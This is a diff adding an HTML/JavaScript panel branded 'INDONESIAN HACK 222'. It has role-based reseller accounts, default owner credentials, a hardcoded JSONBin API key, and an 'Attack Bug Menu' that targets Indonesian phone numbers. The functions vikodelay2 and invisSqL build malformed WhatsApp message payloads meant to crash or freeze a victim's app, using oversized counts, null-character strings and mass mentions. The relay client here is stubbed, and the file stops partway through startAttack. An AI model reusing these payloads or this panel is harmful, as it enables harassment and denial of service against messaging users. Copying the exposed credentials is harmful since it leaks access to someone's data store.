@@ -1,0 +1,1500 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>INDONESIAN HACK 222 — Neon Cloud Panel</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@300;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-1:#050406;
+    --bg-2:#07070a;
+    --neon-1:#ff073a;
+    --neon-2:#ff3b63;
+    --muted:#bda3a8;
+    --glass: rgba(255,255,255,0.02);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;background:
+    radial-gradient(800px 300px at 10% 10%, rgba(255,7,58,0.03), transparent),
+    radial-gradient(700px 300px at 90% 90%, rgba(255,7,58,0.02), transparent),
+    linear-gradient(180deg,var(--bg-1),var(--bg-2));color:#fff;-webkit-font-smoothing:antialiased}
+
+  /* prevent tap highlight on mobile */
+  a, button, input, .menu-item, .opt { -webkit-tap-highlight-color: transparent; -webkit-touch-callout: none; -webkit-user-select: none; -ms-user-select: none; user-select: none; }
+
+  /* neon animations */
+  @keyframes neonPulseText {
+    0%,100% { text-shadow:0 0 6px rgba(255,7,58,0.6),0 0 18px rgba(255,7,58,0.18); }
+    50% { text-shadow:0 0 14px rgba(255,7,58,0.95),0 0 36px rgba(255,7,58,0.26); }
+  }
+  @keyframes neonPulseBox {
+    0%,100% { box-shadow: 0 8px 30px rgba(255,7,58,0.06), inset 0 6px 16px rgba(0,0,0,0.6); }
+    50%  { box-shadow: 0 20px 60px rgba(255,7,58,0.12), inset 0 8px 22px rgba(0,0,0,0.6); }
+  }
+  @keyframes neonBtnPulse {
+    0%,100% { box-shadow: 0 18px 50px rgba(255,7,58,0.14), 0 0 60px rgba(255,7,58,0.06); }
+    50% { box-shadow: 0 28px 80px rgba(255,7,58,0.24), 0 0 120px rgba(255,7,58,0.12); }
+  }
+
+  /* base reset for inputs & buttons to remove default focus/glow */
+  input, button, select, textarea {
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    outline: none;
+    border-radius: inherit;
+  }
+  button::-moz-focus-inner { border: 0; }
+
+  /* pill input & button base */
+  .pill {
+    width:100%;
+    padding:12px 18px;
+    border-radius:999px;
+    border:1px solid rgba(255,255,255,0.06);
+    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.16));
+    color:#fff;
+    font-size:15px;
+    outline:none;
+    transition: box-shadow .18s ease, border-color .12s ease, transform .08s ease;
+    box-shadow: inset 0 6px 14px rgba(0,0,0,0.6);
+    -webkit-tap-highlight-color: transparent;
+  }
+  .pill::placeholder{ color:var(--muted); font-family:monospace; letter-spacing:.6px }
+
+  .pill:focus{
+    border-color: rgba(255,7,58,0.6);
+    box-shadow: 0 0 20px rgba(255,7,58,0.06), inset 0 8px 24px rgba(0,0,0,0.6);
+    outline: none;
+  }
+
+  .neon-btn {
+    display:inline-flex; align-items:center; justify-content:center; gap:10px;
+    padding:12px 18px; border-radius:999px; border=0; cursor:pointer;
+    color:#fff; font-weight:700; letter-spacing:0.6px; text-transform:uppercase;
+    background: linear-gradient(90deg,var(--neon-1),var(--neon-2));
+    animation: neonBtnPulse 3s infinite ease-in-out;
+    transition: transform .12s cubic-bezier(.2,.9,.2,1), box-shadow .18s ease, opacity .12s ease;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .neon-btn:active{ transform: translateY(1px); }
+  .neon-btn:focus{ outline: none; box-shadow: 0 0 18px rgba(255,7,58,0.08); }
+
+  /* logout button */
+  .logout-btn {
+    display:inline-flex; align-items:center; justify-content:center; gap:8px;
+    padding:10px 16px; border-radius:999px; border=0; cursor:pointer;
+    color:#fff; font-weight:700; letter-spacing:0.6px; text-transform:uppercase;
+    background: linear-gradient(90deg, #ff7300, #ffa500);
+    transition: transform .12s cubic-bezier(.2,.9,.2,1), box-shadow .18s ease, opacity .12s ease;
+    -webkit-tap-highlight-color: transparent;
+    font-size:14px;
+  }
+  .logout-btn:active{ transform: translateY(1px); }
+  .logout-btn:focus{ outline: none; box-shadow: 0 0 18px rgba(255,115,0,0.08); }
+
+  /* layout */
+  .center-screen{ min-height:100vh; display:flex; align-items:center; justify-content:center; padding:22px }
+  .login-card{
+    width:380px; max-width:94vw; padding:26px; border-radius:16px;
+    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.18));
+    border:1px solid rgba(255,7,58,0.04); animation:neonPulseBox 4s infinite;
+  }
+  .brand {
+    width:110px;height:110px;border-radius:14px;margin:0 auto 12px;display:grid;place-items:center;
+    background:linear-gradient(180deg,#080809,#0d0b10); border:1px solid rgba(255,7,58,0.06);
+    box-shadow:0 12px 40px rgba(255,7,58,0.04);
+  }
+  .login-title{ font-family:Orbitron, sans-serif; text-align:center; color:var(--neon-1); font-size:20px; animation:neonPulseText 2.6s infinite; margin-bottom:12px; }
+
+  /* app */
+  #app{ display:none; min-height:100vh; overflow:hidden; }
+  .topbar {
+    height:64px; display:flex; align-items:center; gap:12px; padding:10px 18px;
+    border-bottom:1px solid rgba(255,7,58,0.03);
+    background: linear-gradient(180deg, rgba(0,0,0,0.2), rgba(0,0,0,0.12));
+  }
+  .hamburger {
+    width:52px;height:52px;border-radius:12px;display:grid;place-items:center;cursor:pointer;
+    background: linear-gradient(180deg, rgba(255,7,58,0.03), rgba(0,0,0,0.12));
+    border:1px solid rgba(255,7,58,0.04);
+    transition: transform .12s ease, box-shadow .12s ease;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .hamburger:active{ transform: translateY(1px); }
+  .title{ font-family:Orbitron, sans-serif; color:var(--neon-1); font-size:18px; animation:neonPulseText 3s infinite; }
+
+  /* drawer sidebar */
+  .drawer-back { position:fixed; inset:0; background:rgba(0,0,0,0.5); visibility:hidden; opacity:0; transition:.22s; z-index:40; }
+  .drawer-back.show{ visibility:visible; opacity:1; }
+  .drawer {
+    position:fixed; left:0; top:0; bottom:0; width:260px; padding:18px; background: linear-gradient(180deg,#070607,#0a0a0b);
+    transform:translateX(-110%); transition:transform .28s cubic-bezier(.2,.9,.2,1); z-index:50;
+    box-shadow:10px 30px 80px rgba(0,0,0,0.6);
+    border-right:1px solid rgba(255,7,58,0.03);
+  }
+  .drawer.show{ transform:translateX(0); }
+  .profile { display:flex; gap:12px; align-items:center; padding-bottom:12px; border-bottom:1px solid rgba(255,255,255,0.03); margin-bottom:12px; }
+  .avatar { width:64px;height:64px;border-radius:12px;background:linear-gradient(45deg,#051428,#06202a);display:grid;place-items:center;font-weight:700;color:#fff;box-shadow:0 12px 40px rgba(0,0,0,0.6); }
+  .user-meta small{ color:var(--muted); display:block; }
+  .menu-list{ display:flex; flex-direction:column; gap:8px; margin-top:10px; }
+  .menu-item{
+    display:flex;align-items:center;gap:10px;padding:12px;border-radius:10px;cursor:pointer;color:#fff;font-weight:700;
+    transition: transform .14s, background .12s, box-shadow .12s;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .menu-item:hover{ transform:translateX(6px); background: rgba(255,7,58,0.04); }
+  .menu-item:focus{ outline: none; }
+  .menu-item.active{ background: rgba(255,7,58,0.06); box-shadow: 0 6px 18px rgba(255,7,58,0.04); }
+
+  .menu-item .icon{ width:36px;height:36px;border-radius:8px;display:grid;place-items:center; }
+
+  /* main content panel */
+  .wrap{ display:flex; justify-content:center; padding:22px; min-height:calc(100vh - 84px); }
+  .panel{ width:900px; max-width:96vw; padding:20px; border-radius:14px; background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.14)); border:1px solid rgba(255,7,58,0.03); box-shadow: 0 30px 80px rgba(0,0,0,0.6); }
+  .card{ padding:16px; border-radius:12px; background:var(--glass); border:1px solid rgba(255,255,255,0.02); margin-bottom:14px; animation:neonPulseBox 5s infinite; }
+  .card h2{ font-family:Orbitron, sans-serif; color:var(--neon-1); margin:0 0 10px; animation:neonPulseText 3s infinite; }
+  .muted{ color:var(--muted); font-size:13px; }
+
+  .grid { display:flex; gap:16px; flex-wrap:wrap; align-items:flex-start; }
+  .col { flex:1; min-width:260px; }
+
+  /* pill variants in panels */
+  .pill-sm { padding:10px 14px; border-radius:999px; font-size:14px; }
+  .opt-row { display:flex; gap:10px; margin-top:10px; flex-wrap:wrap; }
+  .opt { padding:10px 14px; border-radius:999px; cursor:pointer; border:1px solid rgba(255,255,255,0.04); color:#ffdfe6; font-weight:700; background:transparent; transition: transform .08s, box-shadow .12s; -webkit-tap-highlight-color: transparent; }
+  .opt.selected { background: linear-gradient(90deg,var(--neon-1),var(--neon-2)); color:#fff; box-shadow:0 14px 40px rgba(255,7,58,0.12); }
+
+  .list { margin-top:12px; }
+  .acct { padding:8px; border-radius:10px; background:rgba(255,255,255,0.03); margin-bottom:8px; display:flex; justify-content:space-between; gap:12px; align-items:center; }
+
+  /* modal */
+  .modal{ position:fixed; inset:0; display:grid; place-items:center; background:rgba(0,0,0,0.6); visibility:hidden; opacity:0; transition:all .18s; z-index:120 }
+  .modal.show{ visibility:visible; opacity:1; }
+  .modal-card{ width:320px; padding:18px; border-radius:12px; text-align:center; background: linear-gradient(180deg,#0f0f10,#0a0a0b); border:1px solid rgba(255,7,58,0.06); }
+  .check-badge{ width:84px; height:84px; border-radius:50%; display:grid; place-items:center; margin:0 auto 10px; background: linear-gradient(180deg,var(--neon-1),var(--neon-2)); box-shadow:0 18px 60px rgba(255,7,58,0.14); }
+  .modal h3{ margin:6px 0 0; font-family:Orbitron, sans-serif; color:#fff; }
+
+  @keyframes shake { 0%{transform:translateX(0)}20%{transform:translateX(-8px)}40%{transform:translateX(8px)}60%{transform:translateX(-6px)}80%{transform:translateX(6px)}100%{transform:translateX(0)} }
+  .shake{ animation:shake .36s ease; }
+
+  @media (max-width:980px){
+    .panel{ width:94vw; padding:14px } .drawer{ width:78vw }
+  }
+  
+  /* Badge untuk role */
+  .role-badge {
+    padding: 4px 8px;
+    border-radius: 6px;
+    font-size: 10px;
+    font-weight: bold;
+    text-transform: uppercase;
+  }
+  .role-owner { background: linear-gradient(90deg, #ff073a, #ff3b63); }
+  .role-reseller { background: linear-gradient(90deg, #ff7300, #ffa500); }
+  .role-user { background: linear-gradient(90deg, #00a2ff, #00d4ff); }
+
+  /* Online status */
+  .online { color: #00ff00; }
+  .offline { color: #ff4444; }
+  .status-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    display: inline-block;
+    margin-right: 6px;
+  }
+  .online .status-dot { background: #00ff00; }
+  .offline .status-dot { background: #ff4444; }
+
+  /* Delete button */
+  .delete-btn {
+    background: linear-gradient(90deg, #ff0000, #ff4444);
+    color: white;
+    border: none;
+    padding: 6px 12px;
+    border-radius: 20px;
+    cursor: pointer;
+    font-size: 12px;
+  }
+
+  /* Tabs */
+  .tabs {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 16px;
+    border-bottom: 1px solid rgba(255,255,255,0.1);
+    padding-bottom: 8px;
+  }
+  .tab {
+    padding: 8px 16px;
+    border-radius: 20px;
+    cursor: pointer;
+    background: transparent;
+    border: 1px solid rgba(255,255,255,0.1);
+    color: var(--muted);
+    transition: all 0.3s ease;
+  }
+  .tab.active {
+    background: rgba(255,7,58,0.1);
+    border-color: var(--neon-1);
+    color: #fff;
+  }
+
+  /* History log */
+  .history-item {
+    padding: 10px;
+    border-radius: 8px;
+    background: rgba(255,255,255,0.02);
+    margin-bottom: 8px;
+    border-left: 3px solid var(--neon-1);
+  }
+  .history-create { border-left-color: #00ff00; }
+  .history-delete { border-left-color: #ff4444; }
+  .history-login { border-left-color: #00a2ff; }
+  .history-logout { border-left-color: #ff7300; }
+  .history-attack { border-left-color: #ff07ff; }
+
+  /* Attack status */
+  .attack-status {
+    padding: 10px;
+    border-radius: 8px;
+    margin: 10px 0;
+    text-align: center;
+    font-weight: bold;
+  }
+  .attack-loading { background: rgba(255,255,0,0.1); color: yellow; }
+  .attack-success { background: rgba(0,255,0,0.1); color: #00ff00; }
+  .attack-error { background: rgba(255,0,0,0.1); color: #ff4444; }
+</style>
+</head>
+<body>
+
+  <!-- LOGIN -->
+  <div id="loginScreen" class="center-screen" aria-live="polite">
+    <div class="login-card" role="form" aria-label="Login panel">
+      <div class="brand" aria-hidden="true">
+        <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="24" height="24" rx="6" fill="#0b0b0d"/>
+          <path d="M6 17L12 7l6 10" stroke="#ff073a" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <div class="login-title">LOGIN</div>
+
+      <label style="display:block;margin-bottom:6px;color:#f3c8cf;font-size:13px">Username</label>
+      <input id="loginUser" class="pill" placeholder="Masukkan username" autocomplete="username" value="owner">
+
+      <label style="display:block;margin:8px 0 6px;color:#f3c8cf;font-size:13px">Password</label>
+      <input id="loginPass" type="password" class="pill" placeholder="Masukkan password" autocomplete="current-password" value="owner123">
+
+      <div style="height:12px"></div>
+      <button id="btnLogin" class="neon-btn" aria-label="Login" style="width:100%;">LOGIN</button>
+      <div id="loginError" style="color:#ff97a2;text-align:center;margin-top:10px;display:none">Login gagal — periksa kembali.</div>
+    </div>
+  </div>
+
+  <!-- APP -->
+  <div id="app" aria-hidden="true">
+    <div class="topbar">
+      <div class="hamburger" id="hamb" title="Buka menu" role="button" aria-label="Menu">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M3 6h18M3 12h18M3 18h18" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
+      </div>
+      <div class="title" id="pageTitle">Dashboard</div>
+    </div>
+
+    <div id="drawerBack" class="drawer-back" tabindex="-1" aria-hidden="true"></div>
+    <aside id="drawer" class="drawer" aria-hidden="true">
+      <div class="profile">
+        <div class="avatar" id="avatarInitial">O</div>
+        <div class="user-meta">
+          <div style="font-weight:700;color:#fff;display:flex;align-items:center;gap:8px">
+            <span id="currentUsername">Owner</span>
+            <span id="roleBadge" class="role-badge role-owner">Owner</span>
+          </div>
+          <small id="currentRole">@Owner</small>
+        </div>
+      </div>
+
+      <nav class="menu-list" aria-label="Main menu" id="mainMenu">
+        <!-- Menu akan di-generate berdasarkan role user -->
+      </nav>
+
+      <!-- Logout Button di Sidebar -->
+      <div style="margin-top:auto; padding-top:20px; border-top:1px solid rgba(255,255,255,0.03)">
+        <button id="btnLogout" class="logout-btn" style="width:100%">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
+            <polyline points="16 17 21 12 16 7"></polyline>
+            <line x1="21" y1="12" x2="9" y2="12"></line>
+          </svg>
+          LOGOUT
+        </button>
+      </div>
+    </aside>
+
+    <main class="wrap" id="mainWrap">
+      <section class="panel" id="panelRoot" aria-live="polite">
+        <!-- initial content injected by JS -->
+      </section>
+    </main>
+  </div>
+
+  <!-- modal -->
+  <div id="modal" class="modal" aria-hidden="true">
+    <div class="modal-card">
+      <div class="check-badge" aria-hidden="true">
+        <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17L4 12"/></svg>
+      </div>
+      <h3 id="modalTitle">Berhasil</h3>
+    </div>
+  </div>
+
+<script>
+// ===== JSONBIN.IO CONFIG =====
+const JSONBIN_API_KEY = '$2a$10$kRLaqAZpkAJ8g2ubN2JQi.3FQsE2QEe6lD8KKdJhHqGwUIFbhde8a';
+const JSONBIN_MASTER_KEY = '$2a$10$kRLaqAZpkAJ8g2ubN2JQi.3FQsE2QEe6lD8KKdJhHqGwUIFbhde8a';
+const JSONBIN_BIN_ID = '68f100ddb0e23b3c068fdc05';
+
+// ===== USER SYSTEM =====
+let currentUser = null;
+let cloudData = null;
+let onlineUsers = new Set();
+let syncInterval = null;
+let onlineStatusInterval = null;
+let currentPage = 'dashboard';
+let currentTab = 'create';
+let attackType = 'blank';
+
+// Menu structure based on user level
+const menuStructure = {
+  'owner': [
+    { page: 'dashboard', label: 'Dashboard', icon: 'dashboard' },
+    { page: 'attack_bug', label: 'Attack Bug Menu', icon: 'attack' },
+    { page: 'userbot', label: 'Create User Bot', icon: 'userbot' },
+    { page: 'owner_menu', label: 'Owner Menu', icon: 'owner' },
+    { page: 'reseller_menu', label: 'Reseller Menu', icon: 'reseller' },
+    { page: 'user_menu', label: 'User Menu', icon: 'user' },
+    { page: 'history_logs', label: 'History Logs', icon: 'backup' },
+    { page: 'settings', label: 'Settings', icon: 'backup' }
+  ],
+  'reseller': [
+    { page: 'dashboard', label: 'Dashboard', icon: 'dashboard' },
+    { page: 'attack_bug', label: 'Attack Bug Menu', icon: 'attack' },
+    { page: 'userbot', label: 'Create User Bot', icon: 'userbot' },
+    { page: 'user_menu', label: 'User Menu', icon: 'user' },
+    { page: 'history_logs', label: 'History Logs', icon: 'backup' },
+    { page: 'settings', label: 'Settings', icon: 'backup' }
+  ],
+  'user': [
+    { page: 'dashboard', label: 'Dashboard', icon: 'dashboard' },
+    { page: 'attack_bug', label: 'Attack Bug Menu', icon: 'attack' },
+    { page: 'history_logs', label: 'History Logs', icon: 'backup' },
+    { page: 'settings', label: 'Settings', icon: 'backup' }
+  ]
+};
+
+// Icon mapping
+const iconMap = {
+  dashboard: `<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M3 13h8V3H3v10zm10 8h8v-6h-8v6zm0-8h8V3h-8v10zM3 21h8v-6H3v6z" fill="currentColor"/></svg>`,
+  attack: `<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M2 12l19-9-9 19-2-7-8-3z" fill="currentColor"/></svg>`,
+  userbot: `<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4S8 5.79 8 8s1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" fill="currentColor"/></svg>`,
+  owner: `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4z" fill="currentColor"/><path d="M4 20c0-2.21 3.58-4 8-4s8 1.79 8 4v1H4v-1z" fill="currentColor"/></svg>`,
+  reseller: `<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M3 3h2l1.5 9h11L21 7H7" stroke="currentColor" stroke-width="1.2"/><circle cx="10" cy="20" r="1.6" fill="currentColor"/><circle cx="18" cy="20" r="1.6" fill="currentColor"/></svg>`,
+  user: `<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4S8 5.79 8 8s1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" fill="currentColor"/></svg>`,
+  backup: `<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" stroke="currentColor" stroke-width="1.2"/><path d="M14 2v6h6" stroke="currentColor" stroke-width="1.2"/><path d="M16 13H8" stroke="currentColor" stroke-width="1.2"/><path d="M16 17H8" stroke="currentColor" stroke-width="1.2"/><path d="M10 9H8" stroke="currentColor" stroke-width="1.2"/></svg>`
+};
+
+// DOM Elements
+const loginScreen = document.getElementById('loginScreen');
+const app = document.getElementById('app');
+const hamb = document.getElementById('hamb');
+const drawer = document.getElementById('drawer');
+const drawerBack = document.getElementById('drawerBack');
+const mainMenu = document.getElementById('mainMenu');
+const panelRoot = document.getElementById('panelRoot');
+const pageTitle = document.getElementById('pageTitle');
+const btnLogin = document.getElementById('btnLogin');
+const btnLogout = document.getElementById('btnLogout');
+const modal = document.getElementById('modal');
+const modalTitle = document.getElementById('modalTitle');
+const loginError = document.getElementById('loginError');
+
+// ===== ATTACK BUG FUNCTIONS =====
+// Simulasi fungsi WhatsApp yang diperlukan
+function generateWAMessageFromContent(target, content, options) {
+  return {
+    key: {
+      id: Math.random().toString(36).substring(2, 15),
+      remoteJid: target,
+      fromMe: true
+    },
+    message: content
+  };
+}
+
+// Crypto simulation
+const crypto = {
+  randomBytes: (size) => {
+    const bytes = new Uint8Array(size);
+    for (let i = 0; i < size; i++) {
+      bytes[i] = Math.floor(Math.random() * 256);
+    }
+    return bytes;
+  }
+};
+
+// Client simulation
+const client = {
+  relayMessage: async (target, message, options) => {
+    console.log(`📤 Relaying message to ${target}`, message);
+    // Simulate network delay
+    await new Promise(resolve => setTimeout(resolve, 100));
+    return { status: 'sent' };
+  }
+};
+
+// Vikodelay2 Attack Function
+async function vikodelay2(target) {
+  console.log(`🚀 Starting VIKODELAY2 attack on ${target}`);
+  
+  const album = await generateWAMessageFromContent(target, {
+    albumMessage: {
+      expectedImageCount: 100000000,
+      expectedVideoCount: 0,
+    }
+  }, {});
+  
+  const imagePayload = {
+    imageMessage: {
+      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
+      mimetype: "image/jpeg",
+      fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
+      fileLength: 99999999999,
+      height: 1280,
+      width: 720,
+      mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
+      fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
+      directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&_nc_hot=1758521044",
+      mediaKeyTimestamp: 1758521043,
+      isSampled: true, 
+      viewOnce: false, 
+      contextInfo: {
+        forwardingScore: 999,
+        isForwarded: true, 
+        forwardedNewsletterMessageInfo: {
+          newsletterJid: "120363399602691477@newsletter", 
+          newsletterName: "7eppeli", 
+          contentType: "UPDATE_CARD", 
+          accessibilityText: "\u0000".repeat(9000), 
+          serverMessageId: 18888888
+        }, 
+        mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
+      },
+      scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
+      scanLengths: [3599, 9271, 2026, 2778],
+      midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=", 
+      annotations: [
+        {
+          polygonVertices: [
+            { x: 0.05515563115477562, y: 0.4132135510444641 },
+            { x: 0.9448351263999939, y: 0.4132135510444641 },
+            { x: 0.9448351263999939, y: 0.5867812633514404 },
+            { x: 0.05515563115477562, y: 0.5867812633514404 }
+          ],
+          newsletter: {
+            newsletterJid: "120363399602691477@newsletter",
+            serverMessageId: 3868,
+            newsletterName: "7eppeli",
+            contentType: "UPDATE_CARD",
+            accessibilityText: "\u0000".repeat(1000) 
+          }
+        }
+      ]
+    }
+  };
+  
+  const messages = [];
+  for (let i = 0; i < 100; i++) { // Reduced for demo
+    const imgMsg = await generateWAMessageFromContent(target, imagePayload, {});  
+    imgMsg.message.messageContextInfo = {  
+      messageAssociation: {  
+        associationType: 1,  
+        parentMessageKey: album.key  
+      }  
+    };  
+    messages.push(imgMsg);
+  }
+
+  await client.relayMessage("status@broadcast", album.message, {
+    messageId: album.key.id,
+    statusJidList: [target]
+  });
+  
+  for (const msg of messages) {
+    await client.relayMessage("status@broadcast", msg.message, {
+      messageId: msg.key.id,
+      statusJidList: [target]
+    });
+  }
+  
+  return { success: true, message: "VIKODELAY2 attack completed" };
+}
+
+// Invisible SQL Attack Function  
+async function invisSqL(isTarget) {
+  console.log(`🚀 Starting INVISSQL attack on ${isTarget}`);
+  
+  const Node = [
+    {
+      tag: "bot",
+      attrs: {
+        biz_bot: "1"
+      }
+    }
+  ];
+
+  const msg = generateWAMessageFromContent(isTarget, {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2,
+          messageSecret: crypto.randomBytes(32),
+          supportPayload: JSON.stringify({
+            version: 2,
+            is_ai_message: true,
+            should_show_system_message: true,
+            ticket_id: crypto.randomBytes(16)
+          })
+        },
+        interactiveMessage: {
+          header: {
+            title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
+            hasMediaAttachment: false,
+            imageMessage: {
+              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
+              mimetype: "image/jpeg",
+              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
+              fileLength: "11887",
+              height: 1080,
+              width: 1080,
+              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
+              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
+              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
+              mediaKeyTimestamp: "1750124469",
+              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
+              contextInfo: {
+                mentionedJid: [isTarget],
+                participant: isTarget,
+                remoteJid: isTarget,
+                expiration: 9741,
+                ephemeralSettingTimestamp: 9741,
+                entryPointConversionSource: "WhatsApp.com",
+                entryPointConversionApp: "WhatsApp",
+                entryPointConversionDelaySeconds: 9742,
+                disappearingMode: {
+                  initiator: "INITIATED_BY_OTHER",
+                  trigger: "ACCOUNT_SETTING"
+                }
+              },
+              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
+              scanLengths: [2071, 6199, 1634, 1983],
+              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
+            }
+          },
+          body: {
+            text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
+          },
+          nativeFlowMessage: {
+            messageParamsJson: "{".repeat(1000) // Reduced for demo
+          }
+        }
+      }
+    }
+  }, {});
+
+  await client.relayMessage(isTarget, msg.message, {
+    participant: { jid: isTarget },
+    additionalNodes: Node,
+    messageId: msg.key.id
+  });
+  
+  return { success: true, message: "INVISSQL attack completed" };
+}
+
+// Blank Attack Function
+async function blankAttack(target) {
+  console.log(`🚀 Starting BLANK attack on ${target}`);
+  // Simulate blank attack
+  await new Promise(resolve => setTimeout(resolve, 2000));
+  return { success: true, message: "BLANK attack completed" };
+}
+
+// Main Attack Function
+async function startAttack() {
+  const target = document.getElementById('attackTarget').value.trim();
+  const duration = document.getElementById('attackDuration').value.trim();
+  
+  if (!target || !duration) {
+    showModal('Target dan duration harus diisi!');
+    return;
+  }
+  
+  if (!target.startsWith('62')) {
+    showModal('Target harus nomor Indonesia (62xx)');
+    return;
+  }
+  
+  const attackStatus = document.getElementById('attackStatus') || (() => {
+    const statusDiv = document.createElement('div');
+    statusDiv.id = 'attackStatus';
+    statusDiv.className = 'attack-status attack-loading';
+    document.querySelector('.card').appendChild(statusDiv);
+    return statusDiv;
+  })();
+  
